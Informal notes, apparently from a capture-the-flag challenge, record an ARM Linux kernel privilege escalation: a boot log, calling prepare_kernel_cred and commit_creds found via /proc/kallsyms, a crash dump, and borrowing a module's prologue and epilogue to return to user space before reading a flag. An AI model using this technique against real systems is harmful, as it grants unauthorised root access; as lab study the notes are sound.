rm /tmp/pe.s; vi /tmp/pe.s; as /tmp/pe.s -o /tmp/pe.o; ld /tmp/pe.o -o /tmp/pe; /tmp/pe | base64 


; sched_clock: 32 bits at 24MHz, resolution 41ns, wraps every 178956ms
; PERCPU: Embedded 7 pages/cpu @805ea000 s7296 r8192 d13184 u32768
; Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 27940
; Kernel command line: 'root=/dev/ram rw console=ttyAMA0 rdinit=/sbin/init'
; PID hash table entries: 512 (order: -1, 2048 bytes)
; Dentry cache hash table entries: 16384 (order: 4, 65536 bytes)
; Inode-cache hash table entries: 8192 (order: 3, 32768 bytes)
; Memory: 57292K/112640K available (3579K kernel code, 166K rwdata, 1020K rodata, 203K init, 138K bss, 55348K reserved)
; Virtual kernel memory layout:
;     vector  : 0xffff0000 - 0xffff1000   (   4 kB)
;     fixmap  : 0xfff00000 - 0xfffe0000   ( 896 kB)
;     vmalloc : 0x87000000 - 0xff000000   (1920 MB)
;     lowmem  : 0x80000000 - 0x86e00000   ( 110 MB)
;     modules : 0x7f000000 - 0x80000000   (  16 MB)
;       .text : 0x80008000 - 0x80485f40   (4600 kB)
;       .init : 0x80486000 - 0x804b8c80   ( 204 kB)
;       .data : 0x804ba000 - 0x804e3b20   ( 167 kB)
;        .bss : 0x804e3b20 - 0x805065d0   ( 139 kB)

Googling around and seeing looking for kernel symbols i've found out about /proc/kallsyms

override setuid with:
     prepare_creds()
     commit_creds()
     ??


interesting to see if other people have implemented this in pure asm
i'll check after i solve this


I'm having troubles returning to user spaces, so it seems...
I've ran this piece of code after prepare_kernel_creds and commit_creds:

    movt r1, #0x4141
    mov pc, r1

and my crash is:
pc : [<41410000>]    lr : [<8003f6a0>]    psr: 80000033
sp : 8301bfa0  ip : 00000000  fp : 00000000
r10: 00000000  r9 : 8003f56c  r8 : 8000e348
r7 : 00000017  r6 : 00000041  r5 : 00000000  r4 : 00000000
r3 : 00002710  r2 : 804cbd40  r1 : 41410001  r0 : 00000000
Flags: Nzcv  IRQs on  FIQs on  Mode SVC_32  ISA Thumb  Segment user
Control: 10c53c7d  Table: 62aa806a  DAC: 00000015
Process pe (pid: 549, stack limit = 0x8301a238)
Stack: (0x8301bfa0 to 0x8301c000)
bfa0: 00000000 8000e1a0 00000000 00000000 00000000 8002f32f 00000004 00000000
bfc0: 00000000 00000000 00000041 00000017 000101d6 000101d6 8002f330 00000000
bfe0: 00000000 7ece8e90 00008098 00008138 60000010 00000000 63e30380 bf00bd38
[<8003f6a0>] (commit_creds+0x134/0x210) from [<00000000>] (  (null))
Code: bad PC value


which means i'm reaching that piece of code with no problem.
however i'm also having troubles with putting 0x0 into r0
to make other binaries be able to use setuid

i saw a file named m.ko
maybe ko=kernel object?
lets dump and see how to return from syscall
perhaps it'll be useful

HA noice!
So smort.

I dumped m.ko and used the proluge and return from there:
STMFD           SP!, {R3-R5,LR}
LDMFD           SP!, {R3-R5,PC}

and it worked!

Now i only needed to add a read flag routine